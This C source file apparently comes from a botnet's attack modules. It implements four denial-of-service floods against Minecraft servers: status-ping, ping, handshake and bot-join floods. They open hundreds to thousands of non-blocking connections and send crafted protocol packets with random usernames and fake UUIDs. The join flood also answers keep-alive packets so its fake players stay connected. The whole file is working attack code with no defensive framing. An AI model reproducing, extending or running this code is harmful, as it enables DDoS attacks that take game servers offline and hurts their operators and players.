#define _GNU_SOURCE
#include "../../../../utils/headers/includes.h"
#include "../../../../utils/headers/util.h"
#include "../../../../utils/headers/resolver.h"
#include "../../attack.h"

int append_varint(uint8_t *buf, uint32_t value) {
    int i = 0;
    while (value & 0xFFFFFF80) {
        buf[i++] = (uint8_t)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (uint8_t)value;
    return i;
}

void write_raw(int fd, const uint8_t *buf, int len) {
    sys_sendto(fd, buf, (size_t)len, MSG_NOSIGNAL, NULL, 0);
}

void write_varint(int fd, uint32_t value) {
    uint8_t buf[5];
    write_raw(fd, buf, append_varint(buf, value));
}

void send_packet(int fd, const uint8_t *data, int len) {
    uint8_t lb[5];
    write_raw(fd, lb, append_varint(lb, (uint32_t)len));
    write_raw(fd, data, len);
}

void do_handshake(int fd, int pvn, const char *address, uint16_t port, int next_state) {
    if (!address) return;
    uint8_t pkt[1024];
    int p = 0;
    p += append_varint(pkt + p, 0x00);
    p += append_varint(pkt + p, (uint32_t)pvn);
    size_t alen = strlen(address);
    if (alen > 512) alen = 512;
    p += append_varint(pkt + p, (uint32_t)alen);
    memcpy(pkt + p, address, alen);
    p += alen;
    pkt[p++] = (uint8_t)(port >> 8);
    pkt[p++] = (uint8_t)(port & 0xFF);
    p += append_varint(pkt + p, (uint32_t)next_state);
    send_packet(fd, pkt, p);
}

void do_status_request(int fd) {
    uint8_t pkt[1] = {0x00};
    send_packet(fd, pkt, 1);
}

void do_ping(int fd, int64_t time_val) {
    uint8_t pkt[9];
    pkt[0] = 0x01;
    memcpy(pkt + 1, &time_val, 8);
    send_packet(fd, pkt, 9);
}

void do_login_start(int fd, const char *username) {
    uint8_t pkt[128];
    int p = 0;
    p += append_varint(pkt + p, 0x00); 
    size_t ulen = strlen(username);
    p += append_varint(pkt + p, (uint32_t)ulen);
    memcpy(pkt + p, username, ulen);
    p += ulen;
    
    // UUID v4 Simulation (16 bytes)
    pkt[p++] = 1; // Has UUID (True)
    uint32_t r1 = rand_next(); uint32_t r2 = rand_next();
    uint32_t r3 = rand_next(); uint32_t r4 = rand_next();
    memcpy(pkt + p, &r1, 4); p += 4;
    memcpy(pkt + p, &r2, 4); p += 4;
    memcpy(pkt + p, &r3, 4); p += 4;
    memcpy(pkt + p, &r4, 4); p += 4;

    send_packet(fd, pkt, p);
}

void flood_mccps(struct flood *flood) {
    int sockets_count = get_option_number(flood->num_of_options, flood->options, OPT_CONNS, 1440);
    uint16_t dport = (uint16_t)get_option_number(flood->num_of_options, flood->options, OPT_DPORT, 25565);
    char *domain = get_option_string(flood->num_of_options, flood->options, OPT_DOMAIN, enc[LOCALHOST_STR].string);
    int pvn = get_option_number(flood->num_of_options, flood->options, OPT_MC_VERSION, 754);

    int i;
    int *fds = calloc((size_t)sockets_count, sizeof(int));
    struct pollfd *pfds = calloc((size_t)sockets_count, sizeof(struct pollfd));
    if (!fds || !pfds) return;

    for (i = 0; i < sockets_count; i++) fds[i] = -1;

    while (*flood->running) {
        for (i = 0; i < sockets_count; i++) {
            if (fds[i] == -1) {
                fds[i] = sys_socket(AF_INET, SOCK_STREAM, 0);
                if (fds[i] == -1) continue;
                sys_fcntl(fds[i], F_SETFL, O_NONBLOCK | sys_fcntl(fds[i], F_GETFL, 0));
                struct flood_target target = flood->targets[i % flood->num_of_targets];
                struct sockaddr_in addr = target.sock_addr;
                addr.sin_port = htons(dport);
                sys_connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));
            }
            pfds[i].fd = fds[i];
            pfds[i].events = POLLOUT;
            pfds[i].revents = 0;
        }

        if (sys_poll(pfds, (nfds_t)sockets_count, 50) > 0) {
            for (i = 0; i < sockets_count; i++) {
                if (pfds[i].revents & POLLOUT) {
                    do_handshake(fds[i], pvn, domain, dport, 1);
                    do_status_request(fds[i]);
                    do_ping(fds[i], (int64_t)sys_time(NULL));
                    sys_close(fds[i]);
                    fds[i] = -1;
                } else if (pfds[i].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                    sys_close(fds[i]);
                    fds[i] = -1;
                }
            }
        }
        
        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}

void flood_mcping(struct flood *flood) {
    int sockets_count = get_option_number(flood->num_of_options, flood->options, OPT_CONNS, 1440);
    uint16_t dport = (uint16_t)get_option_number(flood->num_of_options, flood->options, OPT_DPORT, 25565);

    int i;
    int *fds = calloc((size_t)sockets_count, sizeof(int));
    struct pollfd *pfds = calloc((size_t)sockets_count, sizeof(struct pollfd));
    if (!fds || !pfds) return;

    for (i = 0; i < sockets_count; i++) fds[i] = -1;

    while (*flood->running) {
        for (i = 0; i < sockets_count; i++) {
            if (fds[i] == -1) {
                fds[i] = sys_socket(AF_INET, SOCK_STREAM, 0);
                if (fds[i] == -1) continue;
                sys_fcntl(fds[i], F_SETFL, O_NONBLOCK | sys_fcntl(fds[i], F_GETFL, 0));
                struct flood_target target = flood->targets[i % flood->num_of_targets];
                struct sockaddr_in addr = target.sock_addr;
                addr.sin_port = htons(dport);
                sys_connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));
            }
            pfds[i].fd = fds[i];
            pfds[i].events = POLLOUT;
            pfds[i].revents = 0;
        }

        if (sys_poll(pfds, (nfds_t)sockets_count, 50) > 0) {
            for (i = 0; i < sockets_count; i++) {
                if (pfds[i].revents & POLLOUT) {
                    do_ping(fds[i], (int64_t)sys_time(NULL));
                    sys_close(fds[i]);
                    fds[i] = -1;
                } else if (pfds[i].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                    sys_close(fds[i]);
                    fds[i] = -1;
                }
            }
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}

void flood_mchandshake(struct flood *flood) {
    int sockets_count = get_option_number(flood->num_of_options, flood->options, OPT_CONNS, 1440);
    uint16_t dport = (uint16_t)get_option_number(flood->num_of_options, flood->options, OPT_DPORT, 25565);
    char *domain = get_option_string(flood->num_of_options, flood->options, OPT_DOMAIN, enc[LOCALHOST_STR].string);
    int pvn = get_option_number(flood->num_of_options, flood->options, OPT_MC_VERSION, 754);

    int i;
    int *fds = calloc((size_t)sockets_count, sizeof(int));
    struct pollfd *pfds = calloc((size_t)sockets_count, sizeof(struct pollfd));
    if (!fds || !pfds) return;

    for (i = 0; i < sockets_count; i++) fds[i] = -1;

    while (*flood->running) {
        for (i = 0; i < sockets_count; i++) {
            if (fds[i] == -1) {
                fds[i] = sys_socket(AF_INET, SOCK_STREAM, 0);
                if (fds[i] == -1) continue;
                sys_fcntl(fds[i], F_SETFL, O_NONBLOCK | sys_fcntl(fds[i], F_GETFL, 0));
                struct flood_target target = flood->targets[i % flood->num_of_targets];
                struct sockaddr_in addr = target.sock_addr;
                addr.sin_port = htons(dport);
                sys_connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));
            }
            pfds[i].fd = fds[i];
            pfds[i].events = POLLOUT;
            pfds[i].revents = 0;
        }

        if (sys_poll(pfds, (nfds_t)sockets_count, 50) > 0) {
            for (i = 0; i < sockets_count; i++) {
                if (pfds[i].revents & POLLOUT) {
                    char username[17];
                    rand_alphastr(username, 12);
                    do_handshake(fds[i], pvn, domain, dport, 2); 
                    do_login_start(fds[i], username);
                    sys_close(fds[i]);
                    fds[i] = -1;
                } else if (pfds[i].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                    sys_close(fds[i]);
                    fds[i] = -1;
                }
            }
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}

void flood_mcjoin(struct flood *flood) {
    int sockets_count = get_option_number(flood->num_of_options, flood->options, OPT_CONNS, 256);
    uint16_t dport = (uint16_t)get_option_number(flood->num_of_options, flood->options, OPT_DPORT, 25565);
    char *domain = get_option_string(flood->num_of_options, flood->options, OPT_DOMAIN, enc[LOCALHOST_STR].string);
    int pvn = get_option_number(flood->num_of_options, flood->options, OPT_MC_VERSION, 754);

    int i;
    int *fds = calloc((size_t)sockets_count, sizeof(int));
    int *state = calloc((size_t)sockets_count, sizeof(int)); 
    struct pollfd *pfds = calloc((size_t)sockets_count, sizeof(struct pollfd));
    if (!fds || !pfds || !state) return;

    for (i = 0; i < sockets_count; i++) fds[i] = -1;

    while (*flood->running) {
        for (i = 0; i < sockets_count; i++) {
            if (fds[i] == -1) {
                fds[i] = sys_socket(AF_INET, SOCK_STREAM, 0);
                if (fds[i] == -1) continue;
                sys_fcntl(fds[i], F_SETFL, O_NONBLOCK | sys_fcntl(fds[i], F_GETFL, 0));
                struct flood_target target = flood->targets[i % flood->num_of_targets];
                struct sockaddr_in addr = target.sock_addr;
                addr.sin_port = htons(dport);
                sys_connect(fds[i], (struct sockaddr *)&addr, sizeof(addr));
                state[i] = 1;
            }
            pfds[i].fd = fds[i];
            pfds[i].events = (state[i] == 1 ? POLLOUT : POLLIN);
            pfds[i].revents = 0;
        }

        if (sys_poll(pfds, (nfds_t)sockets_count, 100) > 0) {
            for (i = 0; i < sockets_count; i++) {
                if (pfds[i].revents & POLLOUT && state[i] == 1) {
                    char username[17];
                    rand_alphastr(username, 12);
                    do_handshake(fds[i], pvn, domain, dport, 2);
                    do_login_start(fds[i], username);
                    state[i] = 2;
                }
                if (pfds[i].revents & POLLIN) {
                    uint8_t buf[1024];
                    int len = sys_recvfrom(fds[i], buf, sizeof(buf), MSG_DONTWAIT, NULL, NULL);
                    if (len <= 0) {
                        sys_close(fds[i]);
                        fds[i] = -1;
                        state[i] = 0;
                        continue;
                    }
                    // Keep-Alive Respond
                    for(int j=0; j < len - 8; j++) {
                        if (buf[j] == 0x21 || buf[j] == 0x1F || buf[j] == 0x23) { 
                            uint8_t resp[16];
                            int p = 0;
                            resp[p++] = 9; 
                            resp[p++] = 0x10; 
                            memcpy(resp + p, buf + j + 1, 8); 
                            sys_sendto(fds[i], resp, 10, MSG_NOSIGNAL, NULL, 0);
                            break;
                        }
                    }
                }
                if (pfds[i].revents & (POLLERR | POLLHUP | POLLNVAL)) {
                    sys_close(fds[i]);
                    fds[i] = -1;
                    state[i] = 0;
                }
            }
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}
